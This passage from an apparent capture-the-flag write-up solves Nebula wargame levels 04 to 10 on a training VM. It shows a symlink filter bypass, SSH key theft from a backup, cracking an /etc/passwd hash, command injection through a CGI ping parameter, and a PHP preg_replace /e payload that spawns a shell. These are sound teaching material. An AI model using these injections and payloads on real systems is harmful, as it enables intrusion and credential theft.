&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s [file to read]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strstr</span>(argv[<span class="number">1</span>], <span class="string">"token"</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"You may not access '%s'\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(EXIT_FAILURE, <span class="string">"Unable to open %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rc = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(rc == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(EXIT_FAILURE, <span class="string">"Unable to read fd %d"</span>, fd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, buf, rc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This smells like a problem that is solvable by symlink:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">level04@nebula:/home/flag04$ cat token</span><br><span class="line">cat: token: Permission denied</span><br><span class="line">level04@nebula:/home/flag04$ ./flag04 token</span><br><span class="line">You may not access <span class="string">'token'</span></span><br><span class="line">level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/link</span><br><span class="line">level04@nebula:/home/flag04$ ./flag04 /tmp/link</span><br><span class="line">06508b5e-8909-4f38-b630-fdb148a848a2</span><br><span class="line">level04@nebula:/home/flag04$ su flag04</span><br><span class="line">Password:</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>This was really straight forward once the C code is understood.</p>
<h2 id="Level-05"><a href="#Level-05" class="headerlink" title="Level 05:"></a>Level 05:</h2><p>This time there is no source code, but the hint points at insecure directory permissions:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">level05@nebula:/home/flag05$ ls -la</span><br><span class="line">total 5</span><br><span class="line">drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .</span><br><span class="line">drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..</span><br><span class="line">drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup</span><br><span class="line">-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout</span><br><span class="line">-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc</span><br><span class="line">-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile</span><br><span class="line">drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh</span><br><span class="line">level05@nebula:/home/flag05$ cd .backup/</span><br><span class="line">level05@nebula:/home/flag05/.backup$ ls</span><br><span class="line">backup-19072011.tgz</span><br><span class="line">level05@nebula:/home/flag05/.backup$ mkdir /tmp/backup</span><br><span class="line">level05@nebula:/home/flag05/.backup$ tar -xzf backup-19072011.tgz -C /tmp/backup/</span><br><span class="line">level05@nebula:/home/flag05/.backup$ cd /tmp/backup/</span><br><span class="line">level05@nebula:/tmp/backup$ ls</span><br><span class="line">level05@nebula:/tmp/backup$ ls -la</span><br><span class="line">total 0</span><br><span class="line">drwxrwxr-x 3 level05 level05  60 2018-06-25 06:20 .</span><br><span class="line">drwxrwxrwt 5 root    root    160 2018-06-25 06:20 ..</span><br><span class="line">drwxr-xr-x 2 level05 level05 100 2011-07-19 02:37 .ssh</span><br><span class="line">level05@nebula:/tmp/backup$ cd .ssh/</span><br><span class="line">level05@nebula:/tmp/backup/.ssh$ ls</span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub</span><br><span class="line">level05@nebula:/tmp/backup/.ssh$ ssh -i ./id_rsa flag05@localhost</span><br><span class="line">[...]</span><br><span class="line">flag05@nebula:~$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>We find a hidden <code>.backup</code> folder with a compressed backup of the <code>.ssh</code> folder inside containing an SSH keys. We can use it to log in to <code>flag05</code> via SSH and we have the flag.</p>
<h2 id="Level-06"><a href="#Level-06" class="headerlink" title="Level 06:"></a>Level 06:</h2><p>This time we only know that the <code>flag06</code> account came from a legacy unix system. My first guess is that probably means that the <code>/etc/passwd</code> file could contain the password hash. Nowadays the password would reside encrypted in the <code>/etc/shadow</code> file which we can’t even read. Let’s have a look:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06</span><br><span class="line">flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span><br></pre></td></tr></table></figure>
<p>Indeed, we can see a password hash in the field where modern accounts would only show an <code>x</code>. I don’t have a better solution than to crack it, which will probably be easy as the hash function is probably very dated. To achieve this I use <code>scp</code> to upload john the ripper to the Nebula VM.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">~/Downloads scp john-1.8.0.tar.xz level06@192.168.56.101:~</span><br><span class="line">[...]</span><br><span class="line">~/Downloads ssh level06@192.168.56.101</span><br><span class="line">[...]</span><br><span class="line">level06@nebula:~$ ls</span><br><span class="line">john-1.8.0.tar.xz</span><br><span class="line">level06@nebula:~$ ls</span><br><span class="line">john-1.8.0  john-1.8.0.tar.xz</span><br><span class="line">level06@nebula:~$ cd john-1.8.0/</span><br><span class="line">level06@nebula:~/john-1.8.0$ ls</span><br><span class="line">doc  README  run  src</span><br><span class="line">level06@nebula:~/john-1.8.0$ cd src/</span><br><span class="line">level06@nebula:~/john-1.8.0/src$ uname -a</span><br><span class="line">Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 i686 i386 GNU/Linux</span><br><span class="line">level06@nebula:~/john-1.8.0/src$ make linux-x86-sse2</span><br><span class="line">[...]</span><br><span class="line">level06@nebula:~/john-1.8.0/src$ cd ../run/</span><br><span class="line">level06@nebula:~/john-1.8.0/run$ ls</span><br><span class="line">ascii.chr  digits.chr  john  john.conf  lm_ascii.chr  mailer  makechr  password.lst  relbench  unafs  unique  unshadow</span><br><span class="line">level06@nebula:~/john-1.8.0/run$ ./john /etc/passwd</span><br><span class="line">Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2])</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">hello            (flag06)</span><br><span class="line">1g 0:00:00:00 100% 2/3 100.0g/s 75300p/s 75300c/s 75300C/s 123456..marley</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">level06@nebula:~/john-1.8.0/run$ su flag06</span><br><span class="line">Password:</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>Even the compilation took longer than the actual cracking, which reveals a trivial password.</p>
<h1 id="Level-07"><a href="#Level-07" class="headerlink" title="Level 07:"></a>Level 07:</h1><p>This flag revolves around the following Perl CGI script:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">ping</span> </span>&#123;</span><br><span class="line">  $host = $_[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  @output = <span class="string">`ping -c 3 $host 2&gt;&amp;1`</span>;</span><br><span class="line">  <span class="keyword">foreach</span> $line (@output) &#123; <span class="keyword">print</span> <span class="string">"$line"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if Host set. if not, display normal page, etc</span></span><br><span class="line"></span><br><span class="line">ping(param(<span class="string">"Host"</span>));</span><br></pre></td></tr></table></figure>
<p>This will probably require us to inject a command via the <code>$host</code> variable, as the script does not do any input validation. There is also a <code>thttpd.conf</code> file which contains the port where the script is accessible</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">index.cgi  thttpd.conf</span><br><span class="line">level07@nebula:/home/flag07$ cat thttpd.conf</span><br><span class="line"># /etc/thttpd/thttpd.conf: thttpd configuration file</span><br><span class="line"></span><br><span class="line"># This file is for thttpd processes created by /etc/init.d/thttpd.</span><br><span class="line"># Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.</span><br><span class="line"></span><br><span class="line"># Specifies an alternate port number to listen on.</span><br><span class="line">port=7007</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
<p>We can play around without the right permissions from the command line. The <code>Host</code> variable is our entry point for command injection:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">level07@nebula:/home/flag07$ ./index.cgi Host=127.0.0.1</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.044 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.024 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 1998ms</span><br><span class="line">rtt min/avg/max/mdev = 0.011/0.026/0.044/0.014 ms</span><br><span class="line">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;level07@nebula:/home/flag07$ ./index.cgi Host=127.0.0.1;getflag</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.014 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.028 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.051 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 1998ms</span><br><span class="line">rtt min/avg/max/mdev = 0.014/0.031/0.051/0.015 ms</span><br><span class="line">&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;getflag is executing on a non-flag account, this doesn<span class="string">'t count</span></span><br></pre></td></tr></table></figure>
<p>We can inject the getflag command by adding another command to the ping statement via “;”. To get the actual flag the cgi script has to be executed by <code>flag07</code>, which happens if it is called via the thttpd server listening on port 7007. To get the <code>;</code> to work in the Browser we have to encode it first, such that it is suitable for an URL. A quick search for an encoder reveals that the correct symbol is <code>%3B</code>, so we enter the URL into Firefox:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Firefox URL bar: http://10.0.2.14:7007/index.cgi?Host=127.0.0.1%3Bgetflag</span><br><span class="line"></span><br><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.025 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.024 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 1999ms</span><br><span class="line">rtt min/avg/max/mdev = 0.011/0.020/0.025/0.006 ms</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<p>As the output is just plain text I did not bother with a screenshot, but I think it’s clear what I did there. As in level 03 we could also inject a command that compiles a <code>setuid</code> binary to gain a shell.</p>
<h2 id="Level-08"><a href="#Level-08" class="headerlink" title="Level 08"></a>Level 08</h2><p>This time we encounter a package capture file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">level08@nebula:/home/flag08$ ls -la</span><br><span class="line">total 14</span><br><span class="line">drwxr-x--- 2 flag08 level08   86 2012-08-19 03:07 .</span><br><span class="line">drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..</span><br><span class="line">-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout</span><br><span class="line">-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc</span><br><span class="line">-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap</span><br><span class="line">-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile</span><br><span class="line">level08@nebula:/home/flag08$ <span class="built_in">exit</span></span><br><span class="line">root@kali:~<span class="comment"># scp level08@10.0.2.14:~flag08/capture.pcap .</span></span><br></pre></td></tr></table></figure>
<p>We can download it and open it in Wireshark to see if it contains any captured plaintext password transmissions. Wireshark makes this very easy with the <code>Follow &gt; TCP Stream</code> function:</p>
<img src="/2017/03/15/nebula/wireshark.png" title="Wireshark Follow TCP Stream">
<p>The login name <code>l.le.ev.ve.el.l8.8</code> suggest that the keypresses are all transmitted, including backspaces which seem to be represented by dots. This means that the password is not <code>backdoor...00Rm8.ate</code> but rather <code>backd00Rmate</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level08@nebula:~$ su flag08</span><br><span class="line">Password:</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h2 id="Level-09"><a href="#Level-09" class="headerlink" title="Level 09"></a>Level 09</h2><p>To solve level 09 <code>preg_replace</code> in the following PHP script has to be exploited:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">spam</span><span class="params">($email)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $email = preg_replace(<span class="string">"/\./"</span>, <span class="string">" dot "</span>, $email);</span><br><span class="line">  $email = preg_replace(<span class="string">"/@/"</span>, <span class="string">" AT "</span>, $email);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $email;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">markup</span><span class="params">($filename, $use_me)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $contents = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">  $contents = preg_replace(<span class="string">"/(\[email (.*)\])/e"</span>, <span class="string">"spam(\"\\2\")"</span>, $contents);</span><br><span class="line">  $contents = preg_replace(<span class="string">"/\[/"</span>, <span class="string">"&lt;"</span>, $contents);</span><br><span class="line">  $contents = preg_replace(<span class="string">"/\]/"</span>, <span class="string">"&gt;"</span>, $contents);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$output = markup($argv[<span class="number">1</span>], $argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $output;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>The first thing I notice is the excessive use of <code>preg_replace</code> which in turn makes me think that this is the part that should be exploited. As I am not overly familiar with PHP it is always a good idea to look at the documentation. If is often the case that in older programming languages there are functions that are deprecated due to gaping security holes but still kept for compatibility. These are exactly the functions that often appear in CTFs and the security holes are generally well documented.</p>
<p>Before we check, let’s first analyze what the code does: It prints the output of the <code>markup</code> call with two command line arguments as arguments, only one of which is used by <code>markup</code>. <code>markup</code> itself reads the file with the name of the first argument, if the content contains something like <code>[email mail@example.com]</code> it extracts the address and expands <code>@</code> to <code>AT</code> and <code>.</code> to <code>dot</code> via <code>spam</code> and strips off <code>[</code> and <code>]</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">level09@nebula:/home/flag09$ <span class="built_in">echo</span> [email mail@example.com] &gt; /tmp/exploit</span><br><span class="line">level09@nebula:/home/flag09$ ./flag09 /tmp/exploit</span><br><span class="line">PHP Notice:  Undefined offset: 2 <span class="keyword">in</span> /home/flag09/flag09.php on line 22</span><br><span class="line">mail AT example dot com</span><br></pre></td></tr></table></figure>
<p>A look at the documentation reveals that there is indeed a vulnerability in <code>preg_replace</code> with the <code>/e</code> flag which has been deprecated in later PHP versions. The second match group, which is the email address itself, is passed to spam, or is rather injected into spam call in a string, which is the evaluated. From a modern programming standpoint this already sound ridiculous. It’s not that hard to find information about how to exploit it: If we wrap the desired command like <code>{${command}}</code> (for more information search for ‘php complex curly syntax’) it is inserted into the second string such that the command is executed before it’s output is passed to <code>spam</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">level09@nebula:/home/flag09$ <span class="built_in">echo</span> <span class="string">'[email &#123;$&#123;system(sh)&#125;&#125;]'</span> &gt; /tmp/exploit</span><br><span class="line">level09@nebula:/home/flag09$ ./flag09 /tmp/exploit</span><br><span class="line">PHP Notice:  Undefined offset: 2 <span class="keyword">in</span> /home/flag09/flag09.php on line 22</span><br><span class="line">PHP Notice:  Use of undefined constant sh - assumed <span class="string">'sh'</span> <span class="keyword">in</span> /home/flag09/flag09.php(15) : regexp code on line 1</span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">flag09</span><br><span class="line">sh-4.2$ getflag</span><br><span class="line">You have successfully executed getflag on a target account</span><br></pre></td></tr></table></figure>
<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p>We have yet another <code>setuid</code> binary with the following source code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *file;</span><br><span class="line">  <span class="keyword">char</span> *host;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s file host\n\tsends file to host if you have access to it\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  file = argv[<span class="number">1</span>];</span><br><span class="line">  host = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(access(argv[<span class="number">1</span>], R_OK) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> fd;</span><br><span class="line">      <span class="keyword">int</span> ffd;</span><br><span class="line">      <span class="keyword">int</span> rc;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connecting to %s:18211 .. "</span>, host); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">      <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">      <span class="built_in">sin</span>.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">      <span class="built_in">sin</span>.sin_port = htons(<span class="number">18211</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(connect(fd, (<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr_in)) == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to connect to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HITHERE <span class="meta-string">".oO Oo.\n"</span></span></span><br><span class="line">      <span class="keyword">if</span>(write(fd, HITHERE, <span class="built_in">strlen</span>(HITHERE)) == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to write banner to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HITHERE</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connected!\nSending file .. "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      ffd = open(file, O_RDONLY);</span><br><span class="line">      <span class="keyword">if</span>(ffd == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Damn. Unable to open file\n"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      rc = 